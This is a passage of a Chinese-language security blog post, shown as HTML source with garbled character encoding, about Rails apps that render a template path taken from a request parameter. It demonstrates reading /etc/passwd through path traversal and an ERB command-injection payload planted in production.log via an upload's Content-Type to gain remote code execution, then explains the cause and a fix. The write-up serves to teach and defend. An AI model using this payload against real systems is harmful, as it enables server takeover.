    &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;index&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;render&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;è€Œ index çš„æ¨£æ¿å…§å®¹æ˜¯é€™æ¨£ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/index.html.erb --&amp;gt;&lt;/span&gt;
This is INDEX page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å¦å¤–å»ºä¸€å€‹ demo æ¨£æ¿åšç¤ºæ„ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/demo.html.erb --&amp;gt;&lt;/span&gt;
This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å¯¦éš›æ¸¬è©¦ï¼Œå¦‚æœæˆ‘å€‘é€£åˆ° WelcomeController çš„ index actionï¼Œä¸å¸¶ä»»ä½•åƒæ•¸æœƒè®€å– index æ¨¡ç‰ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_index.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_index.png&quot; alt=&quot;Rails render index view&quot; title=&quot;Rails render index view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœå¸¶åƒæ•¸ page=demoï¼Œæœƒè®€å–åˆ° demo æ¨¡ç‰ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_demo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_demo.png&quot; alt=&quot;Rails render demo view&quot; title=&quot;Rails render demo view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ï¼Œå¦‚æœæˆ‘å€‘çŸ¥é“ç®¡ç†ä»‹é¢çš„æ¨¡ç‰ˆè·¯å¾‘ï¼Œé€å‡ºè·¯å¾‘åƒæ•¸å°±å¯ä»¥è®€å–åˆ°ç®¡ç†ä»‹é¢ã€‚é€™å°±æ˜¯ OWASP æ‰€æè¿°çš„é¢¨éšªï¼Œæ”»æ“Šè€…å¾—ä»¥è®€å–ä»»æ„æ¨¡ç‰ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_admin.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_admin.png&quot; alt=&quot;Rails render admin view&quot; title=&quot;Rails render admin view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç„¶è€Œï¼Œç•¶æˆ‘å€‘å˜—è©¦é€å‡ºç³»çµ±çµ•å°è·¯å¾‘ä¾‹å¦‚ /etc/passwd &lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;ï¼Œç¶²é ç«Ÿç„¶åå‡ºäº† /etc/passwd çš„å…§å®¹ï¼é€™å°±æ˜¯ä¹‹å‰æ‰€è¿°çš„ç›´æ¥å­˜å–ç‰©ä»¶å•é¡Œï¼Œå¯ä»¥éæ­·ç›®éŒ„ç€è¦½æª”æ¡ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot; alt=&quot;Rails render Insecure Direct Object References&quot; title=&quot;Rails render Insecure Direct Object References&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é€²éšæ”»æ“Š&quot;&gt;é€²éšæ”»æ“Š&lt;/h3&gt;

&lt;p&gt;é€šå¸¸åœ¨ Rails ç’°å¢ƒä¸‹èƒ½å¤ è®€å–ä»»æ„æª”æ¡ˆï¼Œæ”»æ“Šè€…æœƒå„ªå…ˆå°‹æ‰¾ secret_tokenï¼Œç›®çš„æ˜¯è®Šé€ æƒ¡æ„ session cookie åˆ©ç”¨ Marshal serialize çš„å•é¡Œåš &lt;a href=&quot;http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/&quot;&gt;RCE&lt;/a&gt;ã€‚ç„¶è€Œåœ¨æœ¬æ¡ˆä¾‹ç³»çµ±ä½¿ç”¨äº† Rails 4.1 å¾Œçš„ç‰ˆæœ¬ï¼ŒRails 4.1 é è¨­ä½¿ç”¨äº† JSON-based çš„ serializer é˜²æ­¢äº†ä¹‹å‰çš„ RCE å•é¡Œï¼Œæ‰€ä»¥ä¸¦æ²’æœ‰è¾¦æ³•è¼•é¬†åˆ©ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;ç‚ºäº†å–å¾—ç³»çµ±æ“ä½œæ¬Šï¼Œæˆ‘å€‘å˜—è©¦å°‹æ‰¾å…¶ä»–å¯åˆ©ç”¨çš„åœ°æ–¹ã€‚åœ¨é€™é‚Šæˆ‘å€‘ç™¼ç¾äº†è©²ç«™ç³»çµ± production.log ä¸­å­˜åœ¨ AWS çš„ä¸Šå‚³ç´€éŒ„ã€‚å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;image/png&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&amp;quot;upload_001&amp;quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;æ–¼æ˜¯æˆ‘å€‘å¯ä»¥åˆ©ç”¨ä¸Šå‚³æª”æ¡ˆçš„ Content-Type å…§å®¹ï¼Œå°‡ Embedded Ruby èªå¥ &amp;lt;%=`#{params[:devcore]}`%&amp;gt; æ·»åŠ åˆ° production.log æª”æ¡ˆè£¡é¢ã€‚æ–¼æ˜¯ log çš„å…§å®¹è®Šæˆäº†ä¸‹é¢é€™æ¨£ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;image/png&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&amp;quot;upload_001&amp;quot;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;040211&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;%=`&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:devcore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`%&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&amp;quot;upload_002&amp;quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;æ¥è‘—ï¼Œæˆ‘å€‘å°±å¯ä»¥åˆ©ç”¨å‰é¢çš„å¼±é»è®€å– production.log æª”æ¡ˆï¼Œå†å¸¶ä¸€å€‹ devcore åƒæ•¸ä½œç‚ºæŒ‡ä»¤ï¼Œå¦‚åœ–ï¼ŒæˆåŠŸå–å¾—ç³»çµ±æ“ä½œæ¬Š :p&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_RCE.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_RCE.png&quot; alt=&quot;Rails render Remote Code Execution&quot; title=&quot;Rails render Remote Code Execution&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é¢¨éšªåŸå› &quot;&gt;é¢¨éšªåŸå› &lt;/h3&gt;

&lt;p&gt;ä¸€èˆ¬ä¾†èªª Rails é–‹ç™¼ä¸¦ä¸å¤ªæœƒé€™æ¨£å¯«ï¼Œä½†ç¨å¾®æœå°‹ä¸€ä¸‹ Github é‚„æ˜¯èƒ½ç™¼ç¾é€™ç¨®å¯«æ³•å­˜åœ¨ä¸€äº›å°ˆæ¡ˆä¸­ã€‚æˆ‘æƒ³ä¸»è¦åŸå› å¤šåŠæ˜¯é–‹ç™¼è€…æƒ³è¦å·æ‡¶ï¼Œç„¶å¾Œä¹Ÿå¯èƒ½æƒ³èªªå‹•æ…‹æ¨£æ¿è·¯å¾‘é ‚å¤šå°±è¢«çœ‹åˆ°é¢æ¿çš„ htmlï¼Œç„¡å‚·å¤§é›…ã€‚èª°çŸ¥é“å°±å› ç‚ºé€™æ¨£å°è‡´æ•´å€‹ç¨‹å¼ç¢¼å…§å®¹è¢«è®€å–ã€‚&lt;/p&gt;

&lt;p&gt;è‹¥æœ‰ä¸€å€‹ action è¦å‹•æ…‹é¡¯ç¤ºä¸åŒæ¨¡ç‰ˆçš„éœ€æ±‚ï¼Œç‚ºäº†é¿å…ä¸Šè¿°çš„å•é¡Œï¼Œå°±è¾›è‹¦é»å…ˆç”¨ caseâ€¦when å»åˆ¤æ–·å§ã€‚é€™è·Ÿä¸è¦ç”¨å­—ä¸²çµ„ SQL èªå¥é¿å… SQL injection ä¸€æ¨£ï¼Œé€™ç¨®å¤–é¢å‚³é€²ä¾†çš„åƒæ•¸éƒ½è¦è¬¹æ…è™•ç†çš„è§€å¿µè¦å…§åŒ–åœ¨é–‹ç™¼ä¸­ã€‚&lt;/p&gt;

&lt;p&gt;é™¤äº†é–‹ç™¼è€…åŸºæœ¬ä¸Šä¸æ‡‰è©²é€™æ¨£é–‹ç™¼å¤–ï¼ŒRails æœ¬èº«ä¹Ÿæœ‰ä¸€é»é»å•é¡Œï¼Œç•¶ render è·¯å¾‘æ²’æœ‰å‰¯æª”åï¼Œç„¡æ³•åˆ¤æ–·ä»€éº¼æ ¼å¼æ™‚ï¼Œå°±æœƒç›´æ¥æ¡ç”¨é è¨­çš„ template handlerã€‚&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/resolver.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;extract_handler_and_format_and_variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_formats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shift&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;The file &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; did not specify a template handler. The default is currently ERB, &amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;
              &lt;span class=&quot;s2&quot;&gt;&amp;quot;but will change to RAW in the future.&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;ActiveSupport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Deprecation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;warn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler_for_extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EXTENSIONS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:variants&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pieces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Types&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;

  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variant&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;è€Œé€™è£¡é è¨­çš„ handler æ˜¯ ERBï¼ˆè¦‹ register_default_template_handlerï¼‰ï¼Œæ‰€ä»¥æœ‰æœ¬ç¯‡å¾Œé¢æåˆ°çš„é€²éšæ”»æ“Šï¼Œå¯ä»¥è¢«åˆ©ç”¨ä¾† RCEã€‚&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/handlers.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;extended&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_default_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:erb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ERB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Builder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Raw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register_template_handler&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:ruby&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_proc&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;æ…¶å¹¸çš„æ˜¯ï¼Œç›®å‰ Rails å·²ç¶“æŠŠé è¨­çš„ template handler å¾ ERB æ”¹æˆ RAWï¼Œä¸æœƒè¼•æ˜“æŠŠè¦ render çš„æª”æ¡ˆç•¶æˆ ERB åŸ·è¡Œäº†ã€‚è©³ç´°çš„å…§å®¹è«‹åƒè€ƒé€™å€‹ &lt;a href=&quot;https://github.com/rails/rails/commit/4be859f0fdf7b3059a28d03c279f03f5938efc80&quot;&gt;commit&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;Ruby on Rails èƒ½è®“é–‹ç™¼è€…è¼ƒè¼•é¬†çš„é–‹ç™¼å‡ºå®‰å…¨çš„æ‡‰ç”¨ç¨‹å¼ï¼Œç„¶è€Œï¼Œè‹¥é–‹ç™¼è€…ä¸æ³¨æ„ï¼Œé‚„æ˜¯æœ‰å¯èƒ½å¯«å‡ºåš´é‡çš„æ¼æ´ã€‚æœ¬æ–‡çš„å‹•æ…‹æ¨£æ¿è·¯å¾‘å°±æ˜¯é€™æ¨£ä¸€å€‹ä¾‹å­ï¼Œå®ƒä¸åªæ˜¯ OWASP æ‰€æè¿°çš„å¯ä»¥å­˜å–ä»»æ„æ¨¡ç‰ˆè€Œå·²ï¼Œå®ƒå¯ä»¥éæ­·æª”æ¡ˆï¼Œç”šè‡³å› ç‚º rails é è¨­çš„ template handler æ˜¯ ERBï¼Œé€ æˆé ç«¯å‘½ä»¤åŸ·è¡Œè®“æ”»æ“Šè€…å–å¾—ä¼ºæœå™¨æ“ä½œæ¬Šã€‚&lt;/p&gt;

